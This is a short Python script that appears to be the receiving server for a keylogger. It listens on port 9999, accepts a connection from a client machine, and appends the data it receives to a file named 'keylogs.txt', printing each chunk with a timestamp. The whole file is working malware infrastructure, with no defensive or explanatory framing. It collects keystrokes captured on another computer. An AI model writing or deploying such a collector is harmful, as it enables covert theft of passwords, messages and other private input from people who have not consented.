import socket
import time
host = socket.gethostname()
port = 9999

s = socket.socket()
s.bind((host, port))
s.listen(2)

def file_write(keys):
    with open("keylogs.txt","a") as file:
        for key in keys:
            file.write(key)

print(host)
conn, address = s.accept()
print("Connected to Client: " + str(address))
client_host = conn.recv(1024).decode()
print(client_host,"got connected........")
while True:
    data = conn.recv(1024).decode()
    
    file_write(str(data))
    if not data:
        break
    f=time.time()
    curr = time.ctime(f)
    print(str(data)," ",curr)
    
conn.close()
# import time
# f=time.time()
# curr = time.ctime(f)
# print(curr)